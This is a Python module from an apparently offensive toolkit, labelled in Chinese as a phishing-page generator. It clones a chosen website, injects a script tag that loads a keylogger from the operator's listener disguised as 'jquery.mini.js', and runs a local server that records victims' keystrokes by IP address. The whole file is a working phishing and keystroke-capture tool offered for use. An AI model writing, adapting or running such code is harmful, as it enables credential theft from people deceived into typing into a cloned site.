import os
import sys
from lib.Base_module import Base_module
from colorama import Style,Fore,init
import urllib.request,urllib.parse

class PishingWebsite(Base_module):


    def __init__(self):
        options = [
            ['url', '/', '克隆目标地址'],
            ['addr', '/', '监听地址'],
            ['port', '8000', '监听端口'],
        ]

        moudle_description = {
            'version': 'v1.0',
            'author': 'Gr33k',
            'completion_time': '2019.07.04',
            'name': '生成钓鱼页面',
        }
        super().__init__(moudle_description,options)
        self.version = moudle_description['version']
        self.author = moudle_description['author']
        self.completion_time = moudle_description['completion_time']
        self.name = moudle_description['name']
        self.options = super().return_options(options)
        self.variables = super().return_variables(options)

    def clear_keylog(self):
        if os.system('rm -rf '+ os.path.split(os.path.realpath(__file__))[0] + '/keylog/*') != 0:
            print(Fore.RED + '[-]清除历史键盘记录失败')

    def set_keyjs(self):
        file_data = ''
        with open(os.path.split(os.path.realpath(__file__))[0] + '/../../webserver/static/boot_key.js','r+') as f:
            for line in f:
                if "*monitor*" in line:
                    line = line.replace("*monitor*",self.variables['addr'])
                if "*port*" in line:
                    line = line.replace("*port*", self.variables['port'])
                file_data = file_data + line
        with open(os.path.split(os.path.realpath(__file__))[0] + '/../../webserver/static/jquery.mini.js','w+') as f:
            f.truncate()
            f.write(file_data)
            f.close()

    def change_index(self):
        try:
            res = urllib.request.Request(url=self.variables['url'])
            res = urllib.request.urlopen(res)
            html = res.read().decode('utf8')
        except:
            print(Fore.RED + '[-]抓取目标html失败...')
            return
        with open(os.path.split(os.path.realpath(__file__))[0] + '/../../webserver/templates/index.html','w+') as f:
            try:
                base_url = urllib.parse.urlparse(self.variables['url']).scheme + "://" +urllib.parse.urlparse(self.variables['url']).netloc
                html = html.replace("<head>","<head><base href=\""+ base_url +"\">").replace("</body>","<script src=\"http://"+ self.variables['addr'] + ":" + self.variables['port'] +"/static/jquery.mini.js\" ></script>")
            except:
                print(Fore.RED + '[-]url解析失败，请检查您输入的URL')
                return
            f.truncate()
            f.write(html)
            f.close()

    def start(self):
        if self.variables['url'] != "/" and self.variables['url'] != "":
            print(Fore.GREEN + '[+]开始检测目标URL连通性...')
            try:
                res = urllib.request.urlopen(url=self.variables['url'])
            except:
                print(Fore.RED + '[-]与目标URL建立链接失败...' + Style.RESET_ALL)
                return
            try:
                print(Fore.GREEN + '[+]初始化本地web服务器...')
                self.clear_keylog()
                self.change_index()
                self.set_keyjs()
            except:
                print(Fore.RED + '[-]初始化本地服务器失败' + Style.RESET_ALL)
                return
            print(Fore.GREEN + '[+]正在启动本地web服务器,监听地址:http://' + self.variables['addr'] + ':' + self.variables['port'] + '/' + Style.RESET_ALL)
            print(Fore.GREEN + '[+]Ctrl + C 结束监听时,监听内容保存在项目根目录下/keylog/ip_keylog,txt' + Style.RESET_ALL)
            try:
                if os.system("python3 " + os.path.split(os.path.realpath(__file__))[0] + '/../../webserver/manage.py runserver 0.0.0.0:' + self.variables['port'] ) != 0:
                    print(Fore.RED + '[-]启动失败，请检查端口占用情况' + Fore.RESET)
            except:
                return
